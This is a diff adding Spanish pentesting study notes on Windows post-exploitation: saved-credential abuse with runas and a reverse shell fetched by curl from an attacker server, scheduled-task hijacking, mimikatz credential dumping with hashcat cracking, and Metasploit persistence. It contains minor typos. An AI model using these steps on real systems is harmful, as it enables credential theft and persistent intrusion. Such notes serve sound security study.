@@ -813,7 +813,54 @@ POSTEXPLOTACION
                      Todos los pasos son igual que UNQUOTED SERVICE PATH solo que debemos ponerle el mismo nombre a nuestra reverse shell que el servicio para sustituirlo y que se ejecute nuestro archivo
                         Ej: Si el sercicio se llama filepermservice.exe copiariamos en la ruta nuestra reverse shell asi: 
                            copy C:\User\user\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" 
-                               
+            
+            Saved Creds
+            ...........   
+
+               Usamos las contraseñas guardadas en windows. Se encuentra con winpeas o con comando: cmdkey //list
+                  1 - Creamos reverse shell con msfvenom
+                  2 - Montamos servidor web
+                  3 - Vamos a carpeta tmp y descargamos shell con curl -O URL
+                  4 - Usamos el siguiente comando para mandar ejecutar la reverse shell como admin
+                        runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+            Shedule Task
+            ............
+   
+               Vulnerabilidad de consiste que tener permisos de administrador en las tareas programadas              
+               Vemos las tareas programadas y los permisos con el comando
+                  schtasks /query /fo LIST /v   
+               1 - Movemos nuestra shell.exe a la ruta de la tarea para que se ejecute automaticamente
+               2 - ponemos la maquina atacante en escucha en el puerto configurado en la reverse shell
+
+            Mimikatz
+            ........
+               Extraccion de credenciales con mimikats
+               1 - Descargamso mimikatz.exe y ejecutamos escribiendo mimikatz.exe
+               2 - Ponemos en privilegiado => privilege::debug 
+               3 - Ejecutamos el comando => lsadump::lsa /path
+               4 - Vemos todas las credenciales
+               5 - Desciframos con hashcat, normalmente se guardan en NTML
+                     hashcat -m 1000 HASH /usr/share/wordlists/rockyou.txt
+
+            Persistencia - postexploit-meterpreter
+            ......................................
+
+               Debemos tener sesion activa
+
+               1 - Generamos reverse shell meterpreter con msfvenom
+               2 - Usamos metaexploit y usamos multihandler (recibe reverse shell, pone a la escucha)
+               3 - Lo configuramos con la misma ip y puerto que nuestra reverse shell
+               4 - Subimos la reverse shell con servidor y curl como siempre
+               5 - Damos a run en metasploit para poner en escucha
+               6 - Ejecutamos nuestra shell subida en la maquina objetivo y obtenemos la conexion
+               7 - Ponemos en background con comando bg en metasploit
+               8 - Buscamos en metasploit el modulo de persistencia => use / exploit/windows/persistence3
+               9 - Asociamos a la sesion en bg => set session 1
+               10 - Ejecutamos el exploit persistencia run
+               11 - Ya esta configurado si ponemos el multihandler recuperaremos esa sesion siempre
+
+
 ANONIMATO/TOR
 .............
 
